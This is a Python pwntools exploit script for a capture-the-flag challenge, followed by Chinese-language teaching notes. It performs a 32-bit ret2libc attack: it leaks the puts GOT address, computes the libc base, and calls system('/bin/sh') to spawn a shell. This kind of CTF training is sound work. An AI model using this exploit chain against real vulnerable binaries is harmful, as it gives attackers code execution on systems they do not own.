from pwn import *
from LibcSearcher3 import *

context.log_level = 'debug'

p = remote('pwn.challenge.ctf.show', 28130)
elf = ELF('../code/pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

offset = 0x6B + 4

payload = b'a' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)

p.sendlineafter('O.o?\n', payload)

puts_addr = u32(p.recvuntil('\xf7')[:4])
success(puts_addr)

libc = LibcSearcher('puts', puts_addr)

libcbase = puts_addr - libc.dump('puts')

sys_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')

payload2 = b'a' * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)

p.sendline(payload2)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 使用puts泄露地址
2. puts vs write：
   - puts函数原型：int puts(const char *s)
   - 只需要一个参数（要打印的字符串地址）
   - 比write更简单，不需要指定长度
3. payload结构（第一次）：
   b'a' * offset     - 填充
   + p32(puts_plt)   - 调用puts
   + p32(main_addr)  - puts返回后回到main
   + p32(puts_got)   - puts的参数（GOT表地址）
4. 地址接收：
   u32(p.recvuntil('\xf7')[:4])
   - 32位libc地址通常以\xf7开头
   - 接收4字节，解包为32位整数
5. 与write泄露的区别：
   - puts只需要一个参数，payload更短
   - puts会自动添加换行符，接收时需要注意
6. 关键点：puts是单参数函数，适合简化ROP链
"""
